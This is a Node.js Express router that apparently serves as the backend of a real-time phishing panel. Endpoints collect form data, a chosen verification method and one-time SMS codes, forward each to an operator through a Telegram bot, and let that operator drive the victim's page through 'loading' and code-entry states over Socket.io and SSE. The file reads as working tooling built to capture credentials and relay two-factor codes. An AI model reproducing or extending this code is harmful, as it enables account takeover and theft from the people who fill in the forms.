const express = require('express');
const router = express.Router();
const { v4: uuidv4 } = require('uuid');
const db = require('../db/database');
const telegramBot = require('../bot/telegramBot');
const { calculateExpirationTime } = require('../utils/helpers');

// Validate a key
router.get('/validate-key/:key', async (req, res) => {
  try {
    const { key } = req.params;
    const session = await db.getSession(key);
    
    if (!session) {
      return res.json({ valid: false });
    }
    
    res.json({ valid: true });
  } catch (error) {
    console.error('Error validating key:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Get session status
router.get('/status/:key', async (req, res) => {
  try {
    const { key } = req.params;
    const session = await db.getSession(key);
    
    if (!session) {
      return res.status(404).json({ error: 'Session not found or expired' });
    }
    
    res.json({ state: session.state });
  } catch (error) {
    console.error('Error getting status:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Generate a new session key
router.post('/generate-key', async (req, res) => {
  try {
    const key = uuidv4();
    await db.createSession(key);
    res.json({ key });
  } catch (error) {
    console.error('Error generating key:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Generate a new key automatically
router.post('/generate-key-auto', async (req, res) => {
  try {
    // Generate a new UUID key
    const key = uuidv4();
    
    // Calculate expiration time (24 hours from now)
    const expiresAt = calculateExpirationTime(24);
    
    // Create a new session in the database
    await db.createSession(key, expiresAt);
    
    // Notify the Telegram admin about the auto-generated session
    await telegramBot.notifyAutoGenerated(key);
    
    // Return the key to the client
    res.json({ key });
  } catch (error) {
    console.error('Error generating key:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Submit form data
router.post('/form', async (req, res) => {
  try {
    const { key, ...formData } = req.body;
    
    // Debug logging
    console.log('Form data received:', formData);
    
    if (!key) {
      return res.status(400).json({ error: 'Session key is required' });
    }
    
    const session = await db.getSession(key);
    if (!session) {
      return res.status(404).json({ error: 'Session not found or expired' });
    }
    
    // Save form data
    await db.saveFormData(key, 'form_1', formData);
    
    // Update session state to loading
    await db.updateSessionState(key, 'loading');
    
    // Notify Telegram admin
    await telegramBot.notifyAdmin(key, 'form_1', formData);
    
    res.json({ success: true, state: 'loading' });
  } catch (error) {
    console.error('Error submitting form:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Handle Form2 submission (verification method selection)
router.post('/form2', async (req, res) => {
  try {
    const { key, verificationMethod } = req.body;
    
    if (!key || !verificationMethod) {
      return res.status(400).json({ error: 'Missing required fields' });
    }
    
    // Get session
    const session = await db.getSession(key);
    if (!session) {
      return res.status(404).json({ error: 'Session not found' });
    }
    
    // Save form data
    await db.saveFormData(key, 'form_2', { verificationMethod });
    
    // Update session state to loading_code_entry
    await db.updateSessionState(key, 'loading_code_entry');
    
    // Notify admin via Telegram
    await telegramBot.notifySmsCodeRequest(key, verificationMethod);
    
    // Return success
    res.json({ success: true });
  } catch (error) {
    console.error('Error handling Form2 submission:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Submit Form2 data (verification method selection)
router.post('/form2-old', async (req, res) => {
  try {
    const { key, verificationMethod } = req.body;
    
    if (!key) {
      return res.status(400).json({ error: 'Session key is required' });
    }
    
    const session = await db.getSession(key);
    if (!session) {
      return res.status(404).json({ error: 'Session not found or expired' });
    }
    
    // Save verification method data
    await db.saveFormData(key, 'form_2', { verificationMethod });
    
    // Update session state to loading
    await db.updateSessionState(key, 'loading');
    
    // Notify Telegram admin about Form2 submission
    const formData = await db.getFormData(key);
    await telegramBot.notifyAdmin(key, 'form_2', { ...formData, verificationMethod });
    
    res.json({ success: true, state: 'loading' });
  } catch (error) {
    console.error('Error submitting Form2:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Submit verification code
router.post('/code', async (req, res) => {
  try {
    const { key, code } = req.body;
    
    if (!key || !code) {
      return res.status(400).json({ error: 'Session key and code are required' });
    }
    
    const session = await db.getSession(key);
    if (!session) {
      return res.status(404).json({ error: 'Session not found or expired' });
    }
    
    // Get existing form data to preserve it
    const formData = await db.getFormData(key);
    
    // Save code data
    await db.saveFormData(key, 'code', { code });
    
    // Update session state to loading_pending
    await db.updateSessionState(key, 'loading_pending');
    
    // Notify Telegram admin with the code and preserve existing form data
    await telegramBot.notifyAdmin(key, 'code', { ...formData, code });
    
    res.json({ success: true, state: 'loading_pending' });
  } catch (error) {
    console.error('Error submitting code:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// SSE endpoint for real-time updates
router.get('/events/:key', (req, res) => {
  const key = req.params.key;
  
  // Set headers for SSE
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  
  // Send initial connection message
  res.write(`data: ${JSON.stringify({ type: 'connected', message: 'SSE connection established' })}\n\n`);
  
  console.log(`SSE connection established for key: ${key}`);
  
  // Store the response object in a map to send events later
  if (!req.app.locals.sseClients) {
    req.app.locals.sseClients = new Map();
  }
  
  if (!req.app.locals.sseClients.has(key)) {
    req.app.locals.sseClients.set(key, []);
  }
  
  req.app.locals.sseClients.get(key).push(res);
  
  // Handle client disconnect
  req.on('close', () => {
    console.log(`SSE connection closed for key: ${key}`);
    const clients = req.app.locals.sseClients.get(key) || [];
    const updatedClients = clients.filter(client => client !== res);
    
    if (updatedClients.length > 0) {
      req.app.locals.sseClients.set(key, updatedClients);
    } else {
      req.app.locals.sseClients.delete(key);
    }
  });
});

// State update endpoint
router.post('/state', async (req, res) => {
  try {
    const { key, state } = req.body;
    console.log(`State update request received: key=${key}, state=${state}`);
    
    if (!key || !state) {
      console.log('Missing key or state in request');
      return res.status(400).json({ error: 'Session key and state are required' });
    }
    
    const session = await db.getSession(key);
    if (!session) {
      console.log(`Session not found: ${key}`);
      return res.status(404).json({ error: 'Session not found or expired' });
    }
    
    // Update session state
    await db.updateSessionState(key, state);
    console.log(`Database updated: key=${key}, state=${state}`);
    
    // Notify connected clients via Socket.io
    const io = req.app.get('io');
    console.log(`Socket.io instance available: ${!!io}`);
    
    if (io) {
      // Emit to the specific room
      io.to(key).emit('state_update', { key, state });
      console.log(`Emitted state_update event to room ${key} with state ${state}`);
      
      // Also emit to all clients as a fallback
      io.emit('global_state_update', { key, state });
      console.log(`Emitted global_state_update event with key=${key}, state=${state}`);
    } else {
      console.error('Socket.io instance not available in API route');
    }
    
    // Also notify SSE clients
    if (req.app.locals.sseClients && req.app.locals.sseClients.has(key)) {
      const clients = req.app.locals.sseClients.get(key);
      const eventData = JSON.stringify({ type: 'state_update', key, state });
      
      clients.forEach(client => {
        client.write(`data: ${eventData}\n\n`);
      });
      
      console.log(`Sent SSE update to ${clients.length} clients for key ${key}`);
    }
    
    res.json({ success: true, state });
  } catch (error) {
    console.error('Error updating state:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Force update endpoint for direct state updates
router.post('/force-update', async (req, res) => {
  try {
    const { key, state } = req.body;
    console.log(`Force update request received: key=${key}, state=${state}`);
    
    if (!key || !state) {
      console.log('Missing key or state in force update request');
      return res.status(400).json({ error: 'Session key and state are required' });
    }
    
    const session = await db.getSession(key);
    if (!session) {
      console.log(`Session not found in force update: ${key}`);
      return res.status(404).json({ error: 'Session not found or expired' });
    }
    
    // Update session state if needed
    const currentState = await db.getSessionState(key);
    if (currentState !== state) {
      await db.updateSessionState(key, state);
      console.log(`Database updated in force update: key=${key}, state=${state}`);
    } else {
      console.log(`State already set to ${state} for key ${key}, no database update needed`);
    }
    
    // Notify connected clients via Socket.io
    const io = req.app.get('io');
    console.log(`Socket.io instance available in force update: ${!!io}`);
    
    if (io) {
      // Emit to the specific room
      io.to(key).emit('state_update', { key, state });
      console.log(`Emitted state_update event to room ${key} with state ${state} from force update`);
      
      // Also emit to all clients as a fallback
      io.emit('global_state_update', { key, state });
      console.log(`Emitted global_state_update event with key=${key}, state=${state} from force update`);
    } else {
      console.error('Socket.io instance not available in force update API route');
    }
    
    // Also notify SSE clients
    if (req.app.locals.sseClients && req.app.locals.sseClients.has(key)) {
      const clients = req.app.locals.sseClients.get(key);
      const eventData = JSON.stringify({ type: 'state_update', key, state });
      
      clients.forEach(client => {
        client.write(`data: ${eventData}\n\n`);
      });
      
      console.log(`Sent SSE update to ${clients.length} clients for key ${key} from force update`);
    }
    
    res.json({ success: true, state, message: 'Force update successful' });
  } catch (error) {
    console.error('Error in force update:', error);
    res.status(500).json({ error: 'Server error in force update' });
  }
});

// Add a health check endpoint
router.get('/health', (req, res) => {
  res.status(200).json({ status: 'ok', timestamp: Date.now() });
});

module.exports = router;
